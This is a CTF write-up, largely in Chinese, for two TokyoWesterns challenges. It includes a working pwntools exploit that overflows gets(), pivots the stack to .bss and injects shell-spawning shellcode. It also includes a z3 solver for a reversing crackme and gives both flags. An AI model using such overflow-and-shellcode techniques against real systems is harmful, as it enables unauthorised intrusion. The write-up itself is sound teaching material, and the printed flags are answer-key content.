# TokyoWesterns CTF writeup

solved:

pwn: nothing more to say

reverse: Easy_Crack_Me

---

## nothing more to say

>Japan is fucking hot.
>
>nc nothing.chal.ctf.westerns.tokyo 10001
>
>File: warmup.c, warmup

題目直接提示沒有canary、NX、PIE，不過ASLR估計還是有

```c=
// gcc -fno-stack-protector -no-pie -z execstack  warmup.c -o warmup
#include <stdio.h>

void init_proc() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}


int main(void) {
    char buf[0x100];
    init_proc();
    puts("Hello CTF Players!\nThis is a warmup challenge for pwnable.\nWe provide some hints for beginners spawning a shell to get the flag.\n\n1. This binary has no SSP (Stack Smash Protection). So you can get control of instruction pointer with stack overflow.\n2. NX-bit is disabled. You can run your shellcode easily.\n3. PIE (Position Independent Executable) is also disabled. Some memory addresses are fixed by default.\n\nIf you get stuck, we recommend you to search about ROP and x64-shellcode.\nPlease pwn me :)");
    gets(buf);
    printf(buf);
    return 0;
}
```

overflow的點是gets()，不用找了 ヽ(●´∀`●)ﾉ

看起來是要做shellcode injection，不過有ASLR，要跳到buf[]裡有點難

ROP gadgets也不夠直接做system("/bin/sh")

用ROP把shellcode寫到.bss section？那個setbuf()看起來就很可疑XD

不過我後來不是用這方法打就是了 ∑(￣□￣;)

看一下main()的asm：
```asm=
00000000004006ba <main>:
  4006ba:       55                      push   rbp
  4006bb:       48 89 e5                mov    rbp,rsp
  4006be:       48 81 ec 00 01 00 00    sub    rsp,0x100
  4006c5:       b8 00 00 00 00          mov    eax,0x0
  4006ca:       e8 a8 ff ff ff          call   400677 <init_proc>
  4006cf:       48 8d 3d c2 00 00 00    lea    rdi,[rip+0xc2]        # 400798 <_IO_stdin_used+0x8>
  4006d6:       e8 75 fe ff ff          call   400550 <puts@plt>
  4006db:       48 8d 85 00 ff ff ff    lea    rax,[rbp-0x100]
  4006e2:       48 89 c7                mov    rdi,rax
  4006e5:       b8 00 00 00 00          mov    eax,0x0
  4006ea:       e8 91 fe ff ff          call   400580 <gets@plt>
  4006ef:       48 8d 85 00 ff ff ff    lea    rax,[rbp-0x100]
  4006f6:       48 89 c7                mov    rdi,rax
  4006f9:       b8 00 00 00 00          mov    eax,0x0
  4006fe:       e8 6d fe ff ff          call   400570 <printf@plt>
  400703:       b8 00 00 00 00          mov    eax,0x0
  400708:       c9                      leave  
  400709:       c3                      ret
```

buf[]的位置可以靠rdp來改啊XD

>4006db: lea rax,[rbp-0x100]

先送一次payload把buf[]改到.bss上然後跳到0x4006db再撿一次gets()

第二次才上shellcode然後跳去.bss執行

然後要注意一下printf()也會吃buf[]的位置，payload要調一下

我是直接餵前面puts()的字串給他啦，第二次payload最前面放0x400798

直接從頭放shellcoe的話，printf()會爛掉 (´_ゝ`)

exploit：
```python=
from pwn import *

context.arch='amd64'
#r = process('./warmup')
r = remote('nothing.chal.ctf.westerns.tokyo',10001)
#gdb.attach(r)

bss = 0x601060
gadget1 = 0x4006db

payload = 'A' * 0x100 + p64(bss + 0x100) + p64(gadget1)

r.recv()
r.sendline(payload)

sc = asm(shellcraft.sh())
payload = p64(0x400798) + sc.ljust(0x100, 'A') + p64(bss + 0x8)

r.sendline(payload)
r.interactive()
r.close()
```

>flag：TWCTF{AAAATsumori---Shitureishimashita.}

---

## Easy Crack Me

>Cracking is easy for you.
>
>File: easy_crack_me

經典題，餵flag給程式求flag，flag正確會輸出Correct，反之incorrect

總之，先丟ida或ghidra，不過都會有點跑掉

用objdump會發現沒有_start和__libc_csu_init之類的，應該是link那部分有調

不過ida和ghidra爬一下string去找到Correct之後

追回ref的位址基本上就可以...按F5了 ε٩(๑> ₃ <)۶з


reverse.c是ghidra decompile過的code，不過全貼太多了，拆開來寫好了

這段是確認flag長度==39，然後頭尾是 'TWCTF{' 和 '}'
```c=
if (iParm1 == 2) {
    __s = *(char **)(lParm2 + 8);
    sVar4 = strlen(__s);
    if (sVar4 != 0x27) {
        puts("incorrect");
        exit(0);
    }
    iVar2 = memcmp(__s,"TWCTF{",6);
    if ((iVar2 != 0) || (__s[0x26] != '}')) {
        puts("incorrect");
        exit(0);
    }
```
這段會檢查'0'\~'9'和'a'\~'f'分別在flag中出現幾次，然後去和0x400f00~0x400f40所記錄的次數比對

這邊可以發現0x400f00\~0x400f40裡次數總合為32，剛好是flag去掉'TWCTF{','}'的長度

所以flag的內容都是'0'\~'9'和'a'\~'f'啦\~
```c=
local_28 = 0x3736353433323130;
local_20 = 0x6665646362613938;
local_1b8 = 0;
while (local_188 = __s, local_1b8 < 0x10) {
    while (pcVar5 = strchr(local_188,(int)*(char *)((long)&local_28 + (long)local_1b8)),pcVar5 != (char *)0x0) {
        *(int *)((long)&local_e8 + (long)local_1b8 * 4) = *(int *)((long)&local_e8 + (long)local_1b8 * 4) + 1;
        local_188 = pcVar5 + 1;
    }
    local_1b8 = local_1b8 + 1;
}
iVar2 = memcmp(&local_e8,&DAT_00400f00,0x40);
if (iVar2 != 0) {
    puts("incorrect");
    exit(0);
}
```
稍微改一下變數名，不然有點難看

這段是將flag的內容('{''}'裡的內容)依順序以4個字元為一組，分別做連加和連續XOR

然後分別和0x400f40\~0x400f60,0x400f60\~0x400f80所紀錄的計算結果比對
```c=
while (i < 8) {
    x = 0;
    y = 0;
    j = 0;
    while (j < 4) {
        x = x + (int)__s[(long)j + (long)(i << 2) + 6];
        y = y ^ (int)__s[(long)j + (long)(i << 2) + 6];
        j = j + 1;
    }
    *(int *)((long)&local_168 + (long)i * 4) = x;
    *(uint *)((long)&local_148 + (long)i * 4) = y;
    i = i + 1;
    //判斷式本來在更後面，我把他拉過來
    iVar2 = memcmp(&local_168,&DAT_00400f40,0x20);
    if ((iVar2 != 0) || (iVar2 = memcmp(&local_148,&DAT_00400f60,0x20), iVar2 != 0)) {
        puts("incorrect");
        exit(0);
    }
}
```
這邊跟上面差不多，不過每組不是依序的4個

而是每隔8個一組，比如: (1st, 9th, 17th, 25th), (2nd, 10th, 18th, 26th), ...
```c=
while (i < 8) {
    x = 0;
    y = 0;
    j = 0;
    while (j < 4) {
        x = x + (int)__s[(long)(j << 3) + (long)i + 6];
        y = y ^ (int)__s[(long)(j << 3) + (long)i + 6];
        j = j + 1;
    }
    *(int *)((long)&local_128 + (long)i * 4) = x;
    *(uint *)((long)&local_108 + (long)i * 4) = y;
    i = i + 1;
}
iVar2 = memcmp(&local_128,&DAT_00400fa0,0x20);
if ((iVar2 != 0) || (iVar2 = memcmp(&local_108,&DAT_00400f80,0x20), iVar2 != 0)) {
    puts("incorrect");
    exit(0);
}
```
這段可以當成提示'{''}'中哪些位置是放字母，哪些是放數字

0x400fc0\~0x401040裡會紀錄對應到字母的是0x80, 數字是0xff
```c=
while (local_194 < 0x20) {
    cVar1 = __s[(long)local_194 + 6];
    if ((cVar1 < '0') || ('9' < cVar1)) {
        if ((cVar1 < 'a') || ('f' < cVar1)) {
            *(undefined4 *)((long)local_a8 + (long)local_194 * 4) = 0;
        }
        else {
          *(undefined4 *)((long)local_a8 + (long)local_194 * 4) = 0x80;
        }
    }
    else {
        *(undefined4 *)((long)local_a8 + (long)local_194 * 4) = 0xff;
    }
    local_194 = local_194 + 1;
}
iVar2 = memcmp(local_a8,&DAT_00400fc0,0x80);
if (iVar2 != 0) {
    puts("incorrect");
    exit(0);
}
```
這邊是限制'{''}'中的偶數項和==0x488
```c=
while (local_18c < 0x10) {
    local_190 = local_190 + (int)__s[(long)((local_18c + 3) * 2)];
    local_18c = local_18c + 1;
}
if (local_190 != 0x488) {
    puts("incorrect");
    exit(0);
}
```
這段就直接提示字了
```c=
if ((((__s[0x25] != '5') || (__s[7] != 'f')) || (__s[0xb] != '8')) || (((__s[0xc] != '7' || (__s[0x17] != '2')) || (__s[0x1f] != '4')))) {
    puts("incorrect");
    exit(0);
}
```

然後，算數學?! Σ(ﾟДﾟ；≡；ﾟдﾟ)

開玩笑的，用z3幫忙算吧！(ﾟ3ﾟ)～♪

比較特別的是這裡Int不能做XOR，所以要用BitVec

然後就是把剛剛逆向的內容寫成z3 solver的限制式

不過因為我沒有完全寫上去(字元出現次數不知道要怎麼寫成限制式QAQ)

所以會出現多組解的情況，不過z3只會算出一組符合的解

這邊可以用**否定原先的解**當新的限制式給solver

這樣就可以算出所有解啦｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡
```python=
from z3 import *
import os

flag = []

for i in range(32):
    flag.append(BitVec(i, 7))

s = Solver()

a = [0, 1, 3, 8, 11, 12, 15, 18, 20, 21, 26, 30]

for i in range(32):
    if i in a:
        s.add(flag[i] > 96, flag[i] < 103)
    else:
        s.add(flag[i] > 47, flag[i] < 58, flag[i] != 51)

a = 0
b = 0
x = 0
y = [0x15e, 0xda, 0x12f, 0x131, 0x100, 0x131, 0xfb, 0x102]
z = [0x52, 0xc, 0x1, 0xf, 0x5c, 0x5, 0x53, 0x58]
for i in range(8):
    for j in range(4):
        x = flag[4 * i] + j
        a = a + x
        b = b ^ x
    #print(4 * i, 4 * i + 1, 4 * i + 2, 4 * i + 3, hex(y[i]), hex(z[i]))
    s.add(flag[4 * i] + flag[4 * i + 1] + flag[4 * i + 2] + flag[4 * i + 3] == y[i])
    s.add(flag[4 * i] ^ flag[4 * i + 1] ^ flag[4 * i + 2] ^ flag[4 * i + 3] == z[i])

a = 0
b = 0
x = 0
y = [0x129, 0x103, 0x12b, 0x131, 0x135, 0x10b, 0xff, 0xff]
z = [0x1, 0x57, 0x7, 0xd, 0xd, 0x53, 0x51, 0x51]
for i in range(8):
    for j in range(4):
        x = flag[8 * j] + i
        a = a + x
        b = b ^ x
    #print(i, i + 8, i + 16, i + 24, hex(y[i]), hex(z[i]))
    s.add(flag[i] + flag[i + 8] + flag[i + 16] + flag[i + 24] == y[i])
    s.add(flag[i] ^ flag[i + 8] ^ flag[i + 16] ^ flag[i + 24] == z[i])

s.add(flag[1] == 102, flag[5] == 56, flag[6] == 55, flag[17] == 50, flag[25] == 52, flag[31] == 53)
s.add(flag[0] + flag[2] + flag[4] + flag[6] + flag[8] + flag[10] + flag[12] + flag[14] + flag[16] + flag[18] + flag[20] + flag[22] + flag[24] + flag[26] + flag[28] + flag[30] == 1160)
s.add(flag[0] + flag[1] + flag[3] + flag[8] + flag[11] + flag[12] + flag[15] + flag[18] + flag[20] + flag[21] + flag[26] + flag[30] == 1198)

while s.check() == sat:
    f1a9 = 'TWCTF{' + ''.join([chr(s.model()[each].as_long()) for each in flag]) + '}'
    if os.popen('./easy_crack_me ' + f1a9).read().split()[0] == 'Correct:':
        print f1a9
        break
    s.add(Or(flag[0] != s.model()[flag[0]], flag[4] != s.model()[flag[4]], flag[8] != s.model()[flag[8]], flag[12] != s.model()[flag[12]], flag[16] != s.model()[flag[16]], flag[20] != s.model()[flag[20]], flag[24] != s.model()[flag[24]], flag[28] != s.model()[flag[28]]))
```

>flag: TWCTF{df2b4877e71bd91c02f8ef6004b584a5}
